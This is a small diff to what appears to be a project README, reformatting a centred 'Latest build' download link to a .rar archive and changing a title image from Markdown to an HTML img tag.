@@ -1,4 +1,4 @@
 <p align = "center">
-## [_**Latest build**_](http://www.mediafire.com/file/sbldom3e6b3cuwt/GILvDairy8.rar)
+[Latest Build] http://www.mediafire.com/file/sbldom3e6b3cuwt/GILvDairy8.rar
+<img src="https://github.com/AprilWRoss/Axio/raw/master/Title.png">
 </p>
-![alt text](https://github.com/AprilWRoss/Axio/raw/master/Title.png "GFYL")
